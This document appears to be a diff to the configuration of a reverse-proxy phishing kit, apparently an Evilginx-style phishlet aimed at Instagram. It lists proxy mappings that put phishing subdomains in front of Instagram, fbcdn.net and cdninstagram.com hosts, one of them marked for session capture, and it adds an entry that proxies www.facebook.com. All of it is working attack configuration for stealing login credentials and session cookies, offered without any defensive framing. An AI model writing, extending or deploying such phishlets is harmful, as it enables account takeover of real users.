@@ -5,6 +5,7 @@ proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fbw', orig_sub: 'www', domain: 'facebook.com', session: false, is_landing: false}
   - {phish_sub: 'img', orig_sub: 'instagram.flos1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
   - {phish_sub: 'static.xxx', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
   - {phish_sub: 'static-cdn', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false, auto_filter: true}
